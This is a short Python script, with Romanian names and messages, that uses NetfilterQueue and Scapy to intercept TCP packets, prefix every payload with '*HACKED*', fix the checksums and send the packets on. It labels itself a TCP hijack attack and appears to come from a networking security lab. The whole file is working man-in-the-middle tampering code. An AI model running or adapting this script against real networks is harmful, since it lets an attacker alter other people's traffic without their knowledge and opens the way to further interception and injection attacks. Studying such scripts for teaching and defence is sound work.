from netfilterqueue import NetfilterQueue
from scapy.all import *

MESAJ_RAU = b"*HACKED* "

def modifica_pachet(pkt):
    data = pkt.get_payload()
    scapy_pkt = IP(data)

    if scapy_pkt.haslayer(TCP) and scapy_pkt.haslayer(Raw):
        ip = scapy_pkt[IP]
        tcp = scapy_pkt[TCP]
        payload_original = scapy_pkt[Raw].load

        if len(payload_original) > 0:
            payload_nou = MESAJ_RAU + payload_original
            print(f"Modificat: '{payload_original.decode(errors='ignore')}' -> '{payload_nou.decode(errors='ignore')}'")

            scapy_pkt[Raw].load = payload_nou
            del scapy_pkt[IP].len
            del scapy_pkt[IP].chksum
            del scapy_pkt[TCP].chksum

            pkt.set_payload(bytes(scapy_pkt))

    pkt.accept()

print("TCP Hijack pornit pe NFQUEUE 0...")
print("Toate mesajele vor fi prefixate cu 'HACKED'")

nfqueue = NetfilterQueue()
nfqueue.bind(0, modifica_pachet)

try:
    nfqueue.run()
except KeyboardInterrupt:
    print("Atac oprit.")
